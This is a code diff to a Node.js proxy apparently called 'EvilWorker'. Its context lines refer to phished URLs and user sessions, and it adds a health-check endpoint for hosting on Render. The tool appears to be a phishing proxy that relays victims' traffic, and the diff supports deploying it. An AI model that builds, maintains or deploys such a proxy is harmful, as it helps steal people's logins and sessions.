@@ -44,6 +44,18 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
     const { method, url, headers } = clientRequest;
     const currentSession = getUserSession(headers.cookie);
 
+    // Health check endpoint for Render
+    if (url === "/" || url === "/health") {
+        clientResponse.writeHead(200, { "Content-Type": "application/json" });
+        clientResponse.end(JSON.stringify({ 
+            status: "healthy", 
+            service: "EvilWorker", 
+            timestamp: new Date().toISOString(),
+            uptime: process.uptime()
+        }));
+        return;
+    }
+
     if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
         try {
             const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
@@ -92,7 +104,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                 .on("end", () => {
                     clientRequestBody = Buffer.concat(clientRequestBody).toString();
 
-                    if (!currentSession) {
+                    if (!currentSession ) {
                         if (clientRequestBody) {
                             try {
                                 clientRequestBody = JSON.parse(clientRequestBody);
